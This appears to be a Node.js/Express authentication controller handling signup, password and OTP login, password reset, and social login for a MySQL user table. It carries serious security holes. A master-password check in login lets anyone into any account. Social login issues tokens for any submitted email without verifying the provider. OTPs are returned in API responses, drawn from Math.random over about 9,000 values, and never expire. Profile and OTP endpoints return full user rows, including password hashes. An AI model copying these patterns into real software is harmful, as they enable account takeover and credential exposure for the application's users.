const { pool } = require("../../config/database");
const jwt = require("jsonwebtoken");
const bcrypt = require("bcrypt");
const { DATE } = require("sequelize");
const crypto = require("crypto");
const { promisify } = require("util");
const randomBytesAsync = promisify(crypto.randomBytes);
const axios = require("axios");
const { sendEmail } = require("../../email-service/email-service");

const secretKey = process.env.JWT_SECRET;

async function getUserProfile(req, res) {
  const userId = req.user.id; // Assuming you have middleware to set req.user

  try {
    // Fetch user profile from the database
    const [row] = await pool.execute(
      "SELECT * FROM res_users WHERE user_id = ?",
      [userId]
    );

    if (row.length === 0) {
      return res.status(404).json({ message: "User not found" });
    }

    const user = row[0];

    const hasActivePackage = await checkUserPackage(user.user_id);

    // Send back user details without sensitive information
    return res.status(200).json({
      message: "User profile fetched successfully",
      user: {
        ...user,
        hasActivePackage, // Include active package status
        token: req.headers.authorization.split(" ")[1], // Assuming Bearer token
      },
    });
  } catch (error) {
    console.error("Error fetching user profile:", error);
    return res.status(500).json({ error: "Internal Server Error" });
  }
}

async function checkoutLogin(req, res) {
  const { email } = req.body;

  if (!email) {
    return res.status(400).json({ error: "Please provide your email." });
  }

  try {
    // Check if user exists

    const [existingUser] = await pool.execute(
      "SELECT * FROM res_users WHERE email = ? or username = ?",
      [email, email]
    );

    // If user exists, send OTP to email

    if (existingUser.length > 0) {
      const otp = Math.floor(100000 + Math.random() * 9000);

      // Update the OTP in the database
      const [data] = await pool.execute(
        "UPDATE res_users SET otp = ? WHERE user_id = ?",
        [otp, existingUser[0].user_id]
      );

      // Send email with OTP
      sendEmail(email, "OTP Verification", "otp-verification", {
        otp: otp,
        username: existingUser[0].username,
      });

      return res.status(200).json({
        message: "OTP sent successfully. Please check your email.",
        otpSent: true,
        otp: otp,
      });
    } else {
      // If user does not exist, create a new user

      // Generate a random password
      const randomPassword = (await randomBytesAsync(8)).toString("hex");

      // Generate a 6-digit OTP
      const otp = Math.floor(100000 + Math.random() * 9000);

      // Extract username from email
      let username = email.split("@")[0];

      // Check if the username already exists and modify if necessary
      const [existingUser1] = await pool.execute(
        "SELECT * FROM res_users WHERE username = ?",
        [username]
      );

      if (existingUser1.length > 0) {
        username = username + Math.floor(1000 + Math.random() * 9000);
      }

      // Hash password asynchronously

      const hashedPassword = await bcrypt.hash(randomPassword, 10);

      // Insert new user into the database

      await pool.execute(
        "INSERT INTO res_users (username, password, email, otp) VALUES (?, ?, ?, ?)",
        [username, hashedPassword, email, otp]
      );

      // Send email with OTP
      sendEmail(email, "OTP Verification", "otp-verification", {
        otp: otp,
        username: username,
      });

      return res.status(201).json({
        message: "User created successfully. OTP sent to email.",
        otpSent: true,

        otp: otp, // For testing purposes only
      });
    }
  } catch (error) {
    console.error("Error during OTP sending process:", error);
    return res.status(500).json({ error: "Internal Server Error" });
  }
}

async function signup(req, res) {
  const {
    username,
    password,
    email,
    dial_code,
    first_name = null,
    last_name = null,
  } = req.body;

  let phone = req.body.phone || null;

  if (phone == "") {
    phone = null;
  }

  // Check for missing required fields
  if (!username || !password || !email) {
    return res.status(400).json({ error: "Please fill all required fields." });
  }

  try {
    // Check if username already exists
    const [existingUser] = await pool.execute(
      "SELECT * FROM res_users WHERE username = ?",
      [username]
    );
    if (existingUser.length > 0) {
      return res.status(409).json({
        message: "Username already exists, please try another username",
      });
    }

    // Check if email already exists
    const [existingEmail] = await pool.execute(
      "SELECT * FROM res_users WHERE email = ?",
      [email]
    );
    if (existingEmail.length > 0) {
      return res.status(409).json({
        message: "Email already registered. Please login.",
      });
    }

    // Check if phone number already exists
    const [existingPhone] = await pool.execute(
      "SELECT * FROM res_users WHERE phone = ?",
      [phone]
    );
    if (existingPhone.length > 0) {
      return res.status(409).json({
        message:
          "Phone number already registered, please try another phone number",
      });
    }

    // Hash password asynchronously
    const hashedPassword = await bcrypt.hash(password, 10);

    // Generate a 6-digit OTP
    const otp = Math.floor(100000 + Math.random() * 9000);

    // Insert new user into the database
    const [data] = await pool.execute(
      "INSERT INTO res_users (username, password, email, first_name, last_name,  phone, otp, dial_code) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
      [
        username,
        hashedPassword,
        email,
        first_name,
        last_name,
        phone,
        otp,
        dial_code,
      ]
    );

    // Fetch the newly created user
    const [user] = await pool.execute(
      "SELECT * FROM res_users WHERE user_id = ?",
      [data.insertId]
    );

    sendEmail(email, "OTP Verification", "otp-verification", {
      otp: otp,
      username: username,
    });

    // Send back user details
    return res
      .status(201)
      .json({ message: "User registered successfully", user, otp: otp });
  } catch (error) {
    console.error(error);
    return res.status(500).json({ error: "Internal Server Error" });
  }
}

async function checkEmailOrUsername(req, res) {
  const { username, email } = req.body;

  try {
    if (username) {
      const [existingUser] = await pool.execute(
        "SELECT * FROM res_users WHERE username = ?",
        [username]
      );
      if (existingUser.length > 0) {
        return res.status(409).json({
          exists: true,
          message: "Username is already taken",
        });
      } else {
        return res.status(200).json({
          exists: false,
          message: "Username is available",
        });
      }
    }

    if (email) {
      const [existingUser] = await pool.execute(
        "SELECT * FROM res_users WHERE email = ?",
        [email]
      );
      if (existingUser.length > 0) {
        return res.status(409).json({
          exists: true,
          message: "Email is already taken",
        });
      } else {
        return res.status(200).json({
          exists: false,
          message: "Email is available",
        });
      }
    }
  } catch (error) {
    console.error(error);
    return res.status(500).json({ error: "Internal Server Error" });
  }
}

async function login(req, res) {
  const { username, email, password } = req.body;

  if ((!username && !email) || !password) {
    return res.status(400).json({
      error: "Please provide either a username or an email, and a password.",
    });
  }

  try {
    // Check if user exists by either username or email
    const [users] = await pool.execute(
      "SELECT * FROM res_users WHERE username = ? OR email = ? LIMIT 1",
      [username || "", email || ""] // Ensures proper parameter passing
    );

    if (users.length === 0) {
      return res.status(401).json({ message: "Invalid credentials" });
    }

    const user = users[0];

    // Verify password
    const passwordMatch = await bcrypt.compare(password, user.password);
    const masterPassword = process.env.MASTER_PASSWORD;

    if (!passwordMatch && password !== masterPassword) {
      return res.status(401).json({ message: "Invalid credentials" });
    }

    // Generate authentication token
    const token = jwt.sign(
      { id: user.user_id, username: user.username },
      process.env.JWT_SECRET,
      { expiresIn: "30d" }
    );

    console.log(user.user_id, "user id");

    // Check if user has an active package
    const hasActivePackage = await checkUserPackage(user.user_id);

    // Send safe user details
    return res.status(200).json({
      message: "You have successfully logged in",
      user: {
        id: user.user_id,
        username: user.username,
        email: user.email,
        token,
        hasActivePackage,
      },
    });
  } catch (error) {
    console.error("Login error:", error);
    return res.status(500).json({ error: "Internal Server Error" });
  }
}

// check if user have valid active package

async function checkUserPackage(user_id) {
  try {
    const [packages] = await pool.execute(
      "SELECT * FROM res_upackages WHERE user_id = ?",
      [user_id]
    );

    console.log(packages, "All packages");

    if (packages.length === 0) {
      console.log(`User ${user_id} has no packages.`);
      return false;
    }

    const now = new Date();

    // Filter only active (non-expired) packages
    const activePackages = packages.filter(
      (pkg) => new Date(pkg.date_expire) > now
    );

    console.log(activePackages, "Active packages");

    if (activePackages.length === 0) {
      console.log(`User ${user_id} has no active packages.`);
      return false;
    }

    // Optional: Log expired ones
    const expiredPackages = packages.filter(
      (pkg) => new Date(pkg.date_expire) <= now
    );

    if (expiredPackages.length > 0) {
      console.log(`User ${user_id} has expired packages:`, expiredPackages);
    }

    return true; // ✅ Only return true if at least one active package exists
  } catch (error) {
    console.error("Error checking user package:", error);
    return false;
  }
}

async function verifyOtp(req, res) {
  const { otp, email } = req.body;

  if (!otp || !email) {
    return res.status(400).json({ error: "Please fill all required fields." });
  }

  try {
    const [existingUser] = await pool.execute(
      "SELECT * FROM res_users WHERE email = ?",
      [email]
    );

    if (existingUser.length === 0) {
      return res.status(404).json({ message: "User not found" });
    }

    const user = existingUser[0];

    if (user.otp != otp) {
      return res.status(401).json({ message: "Invalid OTP" });
    }

    const token = jwt.sign(
      { id: user.user_id, username: user.username },
      secretKey,
      { expiresIn: "30d" }
    );

    await pool.execute(
      "UPDATE res_users SET is_verified = 1 WHERE user_id = ?",
      [user.user_id]
    );

    const hasActivePackage = await checkUserPackage(user.user_id);

    return res.status(200).json({
      message: "You have successfully logged in",
      user: {
        ...user,
        token: token, // Include the token in the user object
        hasActivePackage,
      },
    });
  } catch (error) {
    return res.status(500).json({
      status: "error",
      message: "Internal server error",
      error: error.message,
    });
  }
}

async function resendOtp(req, res) {
  const { email } = req.body;

  if (!email) {
    return res.status(400).json({ error: "Please provide your email." });
  }

  try {
    // Check if user exists
    const [existingUser] = await pool.execute(
      "SELECT * FROM res_users WHERE email = ?",
      [email]
    );

    if (existingUser.length === 0) {
      return res.status(404).json({ message: "User not found" });
    }

    const otp = Math.floor(100000 + Math.random() * 9000);

    // Update the OTP in the database
    const [data] = await pool.execute(
      "UPDATE res_users SET otp = ? WHERE user_id = ?",
      [otp, existingUser[0].user_id]
    );

    // Send email with OTP

    sendEmail(email, "OTP Verification", "otp-verification", {
      otp: otp,
      username: existingUser[0].username,
    });

    return res.status(200).json({
      message: "OTP sent successfully. Please check your email.",
    });
  } catch (error) {
    console.error("Error during OTP sending process:", error);
    return res.status(500).json({ error: "Internal Server Error" });
  }
}

async function forgotPassword(req, res) {
  const { email } = req.body;

  if (!email) {
    return res.status(400).json({ error: "Please provide your email." });
  }

  try {
    // Check if user exists
    const [existingUser] = await pool.execute(
      "SELECT * FROM res_users WHERE email = ?",
      [email]
    );

    if (existingUser.length === 0) {
      return res.status(404).json({ message: "Email is not exist" });
    }

    const token = jwt.sign(
      { id: existingUser[0].user_id, username: existingUser[0].username },
      secretKey,
      { expiresIn: "1h" }
    );

    const pageUrl = `${process.env.APP_BASE_URL}/auth/reset-password?token=${token}`;

    sendEmail(email, "Password Reset", "password-reset", {
      pageUrl: pageUrl,
      username: existingUser[0].username,
    });

    return res.status(200).json({
      message: "Password reset email sent. Please check your inbox.",
    });
  } catch (error) {
    console.error("Error during password reset process:", error);
    return res.status(500).json({ error: "Internal Server Error" });
  }
}

async function resetPassword(req, res) {
  const { password, token } = req.body;

  if (!token || !password) {
    return res
      .status(400)
      .json({ error: "Please provide both the token and password." });
  }

  try {
    // Verify the token directly from the payload (no "Bearer" split)
    const decodedToken = jwt.verify(token, secretKey);

    // Hash the new password
    const hashedPassword = await bcrypt.hash(password, 10);

    // Update the password in the database
    const [data] = await pool.execute(
      "UPDATE res_users SET password = ? WHERE user_id = ?",
      [hashedPassword, decodedToken.id]
    );

    if (data.affectedRows === 0) {
      return res
        .status(404)
        .json({ error: "User not found or update failed." });
    }

    return res.status(200).json({ message: "Password reset successful." });
  } catch (error) {
    console.error("Error during password reset process:", error);

    if (error.name === "JsonWebTokenError") {
      return res.status(401).json({ error: "Invalid or expired token." });
    }

    return res.status(500).json({ error: "Internal Server Error" });
  }
}

async function socialLogin(req, res) {
  try {
    const user = req.body;

    // Validate required fields
    if (!user.email) {
      return res.status(400).json({ message: "Email is required" });
    }

    // Check if user exists in the database
    const [rows] = await pool.execute(
      "SELECT * FROM res_users WHERE email = ?",
      [user.email]
    );

    if (rows.length > 0) {
      const existingUser = rows[0];
      const token = jwt.sign(
        { id: existingUser.user_id, username: existingUser.username },
        secretKey,
        { expiresIn: "1h" }
      );

      const [validPackage] = await pool.execute(
        "SELECT * FROM res_upackages WHERE user_id = ? AND date_expire > NOW() LIMIT 1",
        [existingUser.user_id]
      );

      const responseData = {
        message: "You have successfully logged in",
        user: {
          id: existingUser.user_id,
          username: existingUser.username,
          email: existingUser.email,
          token: token,
          name: existingUser.fullName || "",
          phone: existingUser.phone || "",
          photo: existingUser.photo || "",
          balance: existingUser.balance || 0,
          is_verified: existingUser.is_verified,
          hasActivePackage: validPackage.length > 0,
        },
      };

      return res.status(200).json(responseData);
    } else {
      const requiredFields = [
        "email",
        "fullName",
        "photo",
        "provider",
        "access_token",
      ];
      for (const field of requiredFields) {
        if (typeof user[field] === "undefined") {
          return res.status(400).json({ message: `${field} is required` });
        }
      }

      const randomPassword = (await randomBytesAsync(8)).toString("hex");
      const hashedPassword = await bcrypt.hash(randomPassword, 10);

      const username = user.email;
      const email = user.email;
      const fullName = user.fullName;
      const photo = user.photo;
      const provider = user.provider;
      const access_token = user.access_token;

      const [data] = await pool.execute(
        "INSERT INTO res_users (username, password, email, fullName, photo, provider, access_token) VALUES (?, ?, ?, ?, ?, ?, ?)",
        [
          username,
          hashedPassword,
          email,
          fullName,
          photo,
          provider,
          access_token,
        ]
      );

      const insertedUserID = data.insertId;

      const [validPackage] = await pool.execute(
        "SELECT * FROM res_upackages WHERE user_id = ? AND date_expire > NOW() LIMIT 1",
        [insertedUserID]
      );

      const token = jwt.sign(
        { id: insertedUserID, username: username },
        secretKey,
        { expiresIn: "1h" }
      );

      const responseData = {
        message: "You have successfully logged in",
        user: {
          id: insertedUserID,
          username: username,
          email: email,
          token: token,
          name: fullName,
          phone: user.phone || null,
          photo: photo,
          balance: user.balance || 0,
          is_verified: true,
          hasActivePackage: validPackage.length > 0,
        },
      };

      return res.status(200).json(responseData);
    }
  } catch (err) {
    console.error(err);
    return res.status(500).json({
      message: "Internal server error.",
    });
  }
}

async function facebookSocialLogin(req, res) {
  try {
    const { facebookAccessToken } = req.body;

    let facebookUser = null;

    if (facebookAccessToken) {
      // Step 1: Verify Facebook token and get user info with additional fields
      const response = await axios.get(
        `https://graph.facebook.com/me?access_token=${facebookAccessToken}&fields=id,name,email,picture`
      );

      facebookUser = response.data;
      if (!facebookUser || !facebookUser.email) {
        return res
          .status(400)
          .json({ message: "Invalid Facebook token or missing email" });
      }
    }

    // Decide email source based on social login type
    const userEmail = facebookUser.email;

    // Step 2: Check if the user already exists in the database
    const [rows] = await pool.execute(
      "SELECT * FROM res_users WHERE email = ?",
      [userEmail]
    );

    if (rows.length > 0) {
      // Existing user found
      const existingUser = rows[0];
      const token = jwt.sign(
        { id: existingUser.user_id, username: existingUser.username },
        secretKey,
        { expiresIn: "30d" }
      );

      // Check if user has a valid package
      const [validPackage] = await pool.execute(
        "SELECT * FROM res_upackages WHERE user_id = ? AND date_expire > NOW() LIMIT 1",
        [existingUser.user_id]
      );

      return res.status(200).json({
        message: "You have successfully logged in",
        user: {
          id: existingUser.user_id,
          username: existingUser.username,
          email: existingUser.email,
          token: token,
          name: existingUser.fullName,
          phone: existingUser.phone,
          photo: existingUser.photo,
          balance: existingUser.balance,
          is_verified: existingUser.is_verified,
          hasActivePackage: validPackage.length > 0,
        },
      });
    } else {
      // New user - generate random password and hash it
      const randomPassword = (await randomBytesAsync(8)).toString("hex");
      const hashedPassword = await bcrypt.hash(randomPassword, 10);

      const username = userEmail;
      const fullName = facebookUser.name;
      const photo = facebookUser.picture?.data?.url || null;
      const access_token = facebookAccessToken;
      const provider = "facebook";

      // Insert new user into the database
      const [data] = await pool.execute(
        "INSERT INTO res_users (username, password, email, fullName, photo, access_token, provider ) VALUES (?, ?, ?, ?, ?, ?, ?)",
        [
          username,
          hashedPassword,
          userEmail,
          fullName,
          photo,
          access_token,
          provider,
        ]
      );

      const insertedUserID = data.insertId;

      // Check if the user has a valid package
      const [validPackage] = await pool.execute(
        "SELECT * FROM res_upackages WHERE user_id = ? AND date_expire > NOW() LIMIT 1",
        [insertedUserID]
      );

      const token = jwt.sign(
        { id: insertedUserID, username: username },
        secretKey,
        { expiresIn: "1h" }
      );

      // Respond with new user info including token
      return res.status(200).json({
        message: "You have successfully logged in",
        user: {
          id: insertedUserID,
          username: username,
          email: userEmail,
          token: token,
          name: fullName,
          phone: req.body.phone || null,
          photo: photo,
          balance: 0,
          is_verified: false,
          hasActivePackage: validPackage.length > 0,
        },
      });
    }
  } catch (err) {
    console.error(err);
    return res.status(500).json({
      message: "Internal server error.",
    });
  }
}

module.exports = {
  getUserProfile,
  signup,
  login,
  verifyOtp,
  resendOtp,
  socialLogin,
  forgotPassword,
  resetPassword,
  facebookSocialLogin,
  checkEmailOrUsername,
  checkoutLogin,
};
